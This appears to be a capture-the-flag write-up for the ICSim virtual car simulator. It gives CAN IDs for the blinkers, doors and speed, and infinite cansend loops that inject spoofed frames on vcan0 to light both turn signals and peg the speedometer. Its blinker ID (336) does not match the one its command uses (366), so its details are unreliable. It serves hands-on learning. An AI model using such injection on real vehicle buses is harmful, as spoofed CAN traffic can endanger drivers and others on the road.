# Virtual vehicle environment

> Use the following commands: ./controls -l 3 -s 1593226520 vcan0

## My setup

First window:

	$ ./controls -l 3 -s 1593226520 vcan0

Second window

	$ ./icsim -s 1593226520 vcan0 -d

Third window

	$ cansniffer vcan0 -c

See the output

## Challenge and Solution

(a) Find the CAN ID of the Blinkers.

(b) Find the CAN ID that opens all vehicle doors.

(c) Find the CAN ID that increases the speed.

- Blinking lights: ID 336 (Last Byte)
- Vehicle Doors: ID 780
- Speed: ID 3C3 (4th Byte)

Send CAN messages to make both right and left signals light up at the same time. Once you are done, show the results to a crew to get your points awarded.

	$ while true; do cansend vcan0 366#0000000003; done

Send CAN messages to max out the speedometer. Once you are done, show the results to a crew to get your points awarded.

	$ while true; do cansend vcan0 3C3#000000ff000000; done

## References

https://medium.com/@yogeshojha/car-hacking-101-practical-guide-to-exploiting-can-bus-using-instrument-cluster-simulator-part-ee998570758
